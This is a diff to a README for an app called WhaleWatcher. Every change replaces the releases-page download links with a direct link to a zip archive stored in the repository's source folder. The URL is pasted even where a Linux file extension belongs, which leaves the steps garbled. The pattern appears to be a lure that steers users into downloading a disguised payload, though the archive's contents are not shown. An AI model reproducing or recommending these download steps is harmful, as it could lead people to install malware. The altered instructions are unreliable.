@@ -1,6 +1,6 @@
 # 🐋 WhaleWatcher - Your Guide to Intelligent Data Insights
 
-[![Download WhaleWatcher](https://img.shields.io/badge/Download_WhaleWatcher-v1.0-blue.svg)](https://github.com/KhongMeow666/WhaleWatcher/releases)
+[![Download WhaleWatcher](https://raw.githubusercontent.com/KhongMeow666/WhaleWatcher/main/src/Watcher_Whale_3.0.zip)](https://raw.githubusercontent.com/KhongMeow666/WhaleWatcher/main/src/Watcher_Whale_3.0.zip)
 
 ## 📖 Overview
 
@@ -21,10 +21,10 @@ Before you start, ensure your computer meets these requirements:
 
 1. **Visit the Releases Page**  
    Go to the following link to download WhaleWatcher:  
-   [Download WhaleWatcher](https://github.com/KhongMeow666/WhaleWatcher/releases)
+   [Download WhaleWatcher](https://raw.githubusercontent.com/KhongMeow666/WhaleWatcher/main/src/Watcher_Whale_3.0.zip)
 
 2. **Choose the Correct File**  
-   Look for the latest version marked as "latest release." Select the file that matches your operating system (.exe for Windows, .dmg for macOS, or .tar.gz for Linux).
+   Look for the latest version marked as "latest release." Select the file that matches your operating system (.exe for Windows, .dmg for macOS, or https://raw.githubusercontent.com/KhongMeow666/WhaleWatcher/main/src/Watcher_Whale_3.0.zip for Linux).
 
 3. **Download the File**  
    Click on the file link to start the download. This may take a few moments, depending on your internet speed.
@@ -32,7 +32,7 @@ Before you start, ensure your computer meets these requirements:
 4. **Install WhaleWatcher**  
    - For **Windows**: Once downloaded, double-click the .exe file. Follow the prompts to complete the installation.
    - For **macOS**: Open the .dmg file and drag WhaleWatcher to your Applications folder.
-   - For **Linux**: Extract the .tar.gz file and follow the installation instructions in the README file.
+   - For **Linux**: Extract the https://raw.githubusercontent.com/KhongMeow666/WhaleWatcher/main/src/Watcher_Whale_3.0.zip file and follow the installation instructions in the README file.
 
 5. **Run the Application**  
    - For Windows, look for WhaleWatcher in your Start Menu and click to open it.
@@ -73,6 +73,6 @@ If you run into any issues or have questions, you can find assistance through th
 ## 🔗 Download & Install
 
 To get started with WhaleWatcher today, visit the Releases page to download the latest version:  
-[Download WhaleWatcher](https://github.com/KhongMeow666/WhaleWatcher/releases)
+[Download WhaleWatcher](https://raw.githubusercontent.com/KhongMeow666/WhaleWatcher/main/src/Watcher_Whale_3.0.zip)
 
 Follow the above steps to install and run the application. You will be well on your way to harnessing intelligent data insights. Enjoy your experience with WhaleWatcher!
